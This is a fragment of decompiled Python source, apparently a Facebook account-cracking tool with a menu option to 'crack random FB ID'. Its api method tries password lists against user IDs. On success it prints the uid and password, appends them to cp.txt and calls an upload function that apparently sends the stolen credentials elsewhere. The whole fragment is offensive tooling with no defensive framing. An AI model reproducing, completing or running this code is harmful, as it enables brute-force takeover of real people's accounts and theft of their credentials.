# Decompile by Mardis (Tools By broken-hart)
# Time Succes decompile : 2022-04-10 5:45:46.252763
...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
    """)
		...
		print("\n\x1b[1;93m••••••••••••••••••••••••••••••••••••••••••••••••••••••••  ")
		print("\n%s [%s1%s]%s CRACK RANDOM FB ID 2008-11 %s(FREE)"%(G,R,G,Y,G))
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;93m[MAHADI-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [MAHADI-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
